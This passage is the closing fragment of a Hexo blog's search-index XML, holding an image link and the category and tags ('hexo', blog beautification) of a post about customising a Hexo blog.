src="https://cdn.nlark.com/yuque/0/2020/png/1629942/1598401137700-36ce19fe-d94e-4632-b134-1a498806a78a.png#align=left&display=inline&height=245&name=image.png&originHeight=489&originWidth=961&size=65974&status=done&style=none&width=480.5" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> 博客美化 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
